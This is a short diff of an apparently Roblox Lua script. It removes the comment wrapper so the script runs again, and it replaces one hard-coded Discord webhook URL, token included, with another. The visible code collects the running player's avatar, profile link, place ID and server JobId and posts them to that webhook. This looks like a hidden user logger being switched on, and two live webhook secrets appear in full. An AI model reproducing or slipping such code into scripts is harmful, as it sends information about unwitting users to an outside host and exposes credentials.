@@ -1,4 +1,3 @@
---[[
 function SendMessage(url, message)  
     local http = game:GetService("HttpService")  
     local headers = {  
@@ -72,7 +71,7 @@ local avatarUrl = avatarData.data[1].imageUrl
   
 local profileUrl = "https://www.roblox.com/tr/users/" .. avatarId .. "/profile"  
 local currentTime = os.date("%Y-%m-%d %H:%M:%S")  
-local url = "https://discord.com/api/webhooks/1383854921497182238/dg3jORBUgMKQojqULsvENWxBI3onXZa-oPmqWQfxHHD02UNYXrDF8oCpTfvt42DvDRMb"  
+local url = "https://discord.com/api/webhooks/1391500160252514324/ELhzWrkgdaah6eJD7oxNACoE9Ppzjth1A-enC9aGm8thjydRKbECSzi3LrZ1W9_ScFkl"  
 local randomColor = math.random(000001, 999999)  
 local gameId = tostring(game.PlaceId)  
 local instanceId = game.JobId  
@@ -152,7 +151,6 @@ local embed = {
 }  
   
 SendMessageEMBED(url, embed)
-]]
 
 
 
